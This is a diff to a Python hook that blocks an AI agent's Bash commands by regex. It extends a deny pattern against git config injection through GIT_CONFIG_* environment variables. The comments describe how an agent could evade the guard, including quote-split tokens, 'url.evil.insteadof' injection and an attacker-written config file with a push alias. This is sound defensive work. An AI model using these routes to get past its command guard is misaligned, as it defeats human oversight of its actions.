@@ -48,10 +48,13 @@ best-effort auxiliary layer, not a primary defense boundary. Its Bash-command te
 case-insensitive (`re.IGNORECASE` on every `_DENY_PATTERNS` entry), also matches a quote/
 backslash-stripped normalization of the command (a Maker splitting a denied token across quote
 boundaries, e.g. `g"i"t push`, would otherwise slip past a literal-substring match), and denies
-the `GIT_CONFIG_KEY_*`/`GIT_CONFIG_VALUE_*`/`GIT_CONFIG_COUNT`/`GIT_CONFIG_PARAMETERS` and bare
-`GIT_CONFIG=` env-var-based config-injection mechanism (an alternate way to set the same
-`insteadOf`/`credential.helper`/`alias.` keys the patterns already deny via `-c`/`git config`,
-without a literal `-c` or `config` token appearing anywhere). None of this amounts to full shell parsing/evaluation, which is explicitly **not** a
+git's env-var-based config mechanism — `GIT_CONFIG_KEY_*`/`GIT_CONFIG_VALUE_*`/`GIT_CONFIG_COUNT`/
+`GIT_CONFIG_PARAMETERS`, the bare `GIT_CONFIG=` assignment, and the `GIT_CONFIG_GLOBAL=`/
+`GIT_CONFIG_SYSTEM=` file selectors (which point git at an attacker-controlled config file that
+can carry the same `insteadOf`/`credential.helper`/`alias.` keys). These are alternate ways to
+set those keys the patterns already deny via `-c`/`git config`, without a literal `-c` or `config`
+token appearing anywhere; they are matched case-sensitively (git only honors the uppercase names)
+so an ordinary lowercase `git_config=` shell variable is not false-flagged. None of this amounts to full shell parsing/evaluation, which is explicitly **not** a
 goal of this hook — the actual structural guarantees are layer 2 (env-level credential
 stripping, see `loop_driver_support.maker_env()`) and, for the `.git/config`-tampering vector
 specifically, the driver-side hardening in `loop_driver_support.hardened_git_config_args()` /
@@ -185,25 +188,37 @@ _DENY_PATTERNS: tuple[re.Pattern[str], ...] = tuple(
         # (the `-c` flag sets the config key inline), so it would otherwise evade the blanket
         # `git ... config` deny above.
         rf"\bgit\b{_filler(8)}{_SEP}-c{_SEP}url\.",
-        # SEC-MED: `GIT_CONFIG_KEY_<n>`/`GIT_CONFIG_VALUE_<n>`/`GIT_CONFIG_COUNT`, plus the two
-        # sibling members of git's env-var-based config-injection mechanism —
+        # SEC-MED: `GIT_CONFIG_KEY_<n>`/`GIT_CONFIG_VALUE_<n>`/`GIT_CONFIG_COUNT`, plus the other
+        # members of git's env-var-based config mechanism that a Maker could weaponize —
         # `GIT_CONFIG_PARAMETERS` (git's own transport for propagating `-c key=value` pairs to a
         # child process; `GIT_CONFIG_PARAMETERS="'url.evil.insteadof=...'" git push ...` injects
         # an arbitrary config for one invocation with neither `-c` nor `config` appearing as a
-        # literal token) and the bare `GIT_CONFIG=<path>` assignment (redirects a scope-less
+        # literal token); the bare `GIT_CONFIG=<path>` assignment (redirects a scope-less
         # `git config` write, or supplies the config file a `git -c ...`/`git ...` invocation
         # reads, again without a `config`/`-c` token — the `git ... config` blanket deny only
-        # catches the `git config` subcommand shape, not `GIT_CONFIG=... git -c ...`). Each sets
-        # config for one invocation without a literal `-c`/`config` token, evading every pattern
-        # above (e.g. `GIT_CONFIG_COUNT=1 GIT_CONFIG_KEY_0=url.evil.insteadof
-        # GIT_CONFIG_VALUE_0=... git push ...`). This mirrors the lib-side `_stripped_host_env`
-        # stripping (EV-170) so the guard and lib recognize the same env-var mechanism.
-        # The `_(?:KEY_\d+|VALUE_\d+|COUNT|PARAMETERS)\b` branch keeps the `\b` end-boundary so
-        # the legitimate config *file* selectors `GIT_CONFIG_GLOBAL`/`GIT_CONFIG_SYSTEM`/
-        # `GIT_CONFIG_NOSYSTEM` do not match; the bare `=` branch requires the assignment `=`
-        # immediately after `GIT_CONFIG` for the same reason (those selectors have a `_<suffix>`,
-        # not `=`, right after `GIT_CONFIG`).
-        r"\bGIT_CONFIG(?:_(?:KEY_\d+|VALUE_\d+|COUNT|PARAMETERS)\b|=)",
+        # catches the `git config` subcommand shape, not `GIT_CONFIG=... git -c ...`); and the
+        # config *file* selectors `GIT_CONFIG_GLOBAL=<path>`/`GIT_CONFIG_SYSTEM=<path>`, which
+        # point git at an arbitrary attacker-controlled config file for one invocation. That file
+        # can define an `[alias]` (e.g. `p = push`) or `insteadOf`/`credential.helper` entry the
+        # Maker created earlier via an allowed `Write` to a non-`.git` path, so
+        # `GIT_CONFIG_GLOBAL=/tmp/evil.cfg git p ...` runs an aliased push with no literal
+        # `push`/`-c`/`config`/`alias.` token anywhere — evading every pattern above. Each of
+        # these sets or sources config for one invocation without a literal `-c`/`config` token
+        # (e.g. `GIT_CONFIG_COUNT=1 GIT_CONFIG_KEY_0=url.evil.insteadof GIT_CONFIG_VALUE_0=... git
+        # push ...`). This mirrors the lib-side `_stripped_host_env` stripping (EV-170) so the
+        # guard and lib recognize the same env-var mechanism.
+        #
+        # `GIT_CONFIG_NOSYSTEM` is deliberately NOT denied: it is a boolean toggle (`=1`) that
+        # only *disables* reading the system config, so it cannot inject any config key/file. The
+        # `_(?:...GLOBAL|SYSTEM)\b` branch's `\b` end-boundary keeps `GIT_CONFIG_NOSYSTEM` out
+        # (its text after `GIT_CONFIG_` is `NOSYSTEM`, which none of the alternatives match), and
+        # the bare `=` branch requires the assignment `=` immediately after `GIT_CONFIG`.
+        #
+        # This whole `GIT_CONFIG...` group is matched case-*sensitively* via `(?-i:...)` (which
+        # locally overrides the module-wide `re.IGNORECASE`): git only honors these variables in
+        # uppercase, so a case-insensitive match would false-positive on an ordinary lowercase
+        # shell variable such as `git_config=/tmp/x` that has no effect on git at all.
+        r"(?-i:\bGIT_CONFIG(?:_(?:KEY_\d+|VALUE_\d+|COUNT|PARAMETERS|GLOBAL|SYSTEM)\b|=))",
         rf"\bgh\b{_filler(4)}{_SEP}pr\b",  # gh pr create/merge/close/edit/...
         rf"\bgh\b{_filler(4)}{_SEP}api\b",  # gh api (REST bypass for PR mutation)
         r"\bssh\b",  # direct ssh (custom push transport / remote command execution)
